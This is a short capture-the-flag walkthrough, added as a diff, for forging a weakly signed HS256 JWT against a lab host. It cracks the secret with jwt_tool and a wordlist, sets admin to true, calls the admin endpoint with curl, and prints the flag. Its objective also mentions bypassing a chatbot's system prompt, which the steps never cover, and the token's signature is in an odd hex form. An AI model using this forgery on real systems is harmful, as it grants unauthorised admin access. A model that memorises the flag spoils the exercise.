@@ -1,0 +1,27 @@
+Side Mission: JWT Reveal
+
+Target: 10.10.10.205
+Vulnerability: Weakly signed JWT using HS256
+
+Objective:
+Bypass the chatbot's system prompt and extract the hidden FLAG variable stored in memory.
+
+Leaked Token:
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
+eyJ1c2VyIjoiamFuZSIsImFkbWluIjpmYWxzZX0.
+a830b7d5c20b6b5f1d3727e2780b9e1c5406fabe
+
+Steps:
+1. Decode token via jwt.io
+2. Crack secret key using jwt_tool or hashcat:
+   jwt_tool token.jwt -C -d rockyou.txt
+
+3. Modify payload to include:
+   {"user":"jane","admin":true}
+
+4. Sign new token with cracked secret 'letmein'
+5. Submit:
+   curl -H "Authorization: Bearer <token>" http://10.10.10.205/api/admin/flag
+
+Flag:
+CTF{jwt_f0rg3ry_br34k}
